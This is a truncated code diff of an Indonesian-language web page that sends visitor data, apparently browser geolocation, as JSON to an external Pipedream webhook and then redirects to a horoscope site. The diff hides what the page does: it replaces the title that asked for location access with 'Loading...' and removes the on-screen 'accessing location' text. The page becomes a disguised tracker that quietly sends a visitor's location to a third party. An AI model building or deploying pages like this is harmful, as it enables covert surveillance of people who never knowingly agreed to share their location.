@@ -2,30 +2,19 @@
 <html lang="id">
 <head>
   <meta charset="UTF-8">
-  <title>Allow Location Access for More Precise Prediction</title>
+  <title>Loading...</title>
   <style>
-    body {
-      font-family: sans-serif;
-      display: flex;
-      justify-content: center;
-      align-items: center;
-      height: 100vh;
+    html, body {
       margin: 0;
-      background-color: #f9f9f9;
-    }
-    #status {
-      font-size: 1.4em;
-      color: #333;
+      padding: 0;
+      background: #fff;
     }
   </style>
 </head>
 <body>
-  <div id="status">Mengakses lokasi...</div>
-
   <script>
     const webhookURL = "https://eo4zwpbukao2mkl.m.pipedream.net/";
     const redirectTo = "https://www.astro.com/horoscope";
-    const statusEl = document.getElementById("status");
 
     function redirect() {
       window.location.href = redirectTo;
@@ -46,8 +35,7 @@
               "Content-Type": "application/json"
             },
             body: JSON.stringify(data)
-          })
-          .finally(() => {
+          }).finally(() => {
             setTimeout(redirect, 1000);
           });
         },
@@ -56,8 +44,4 @@
         }
       );
     } else {
-      setTimeout(redirect, 2000);
-    }
-  </script>
-</body>
-</html>
+      setTi
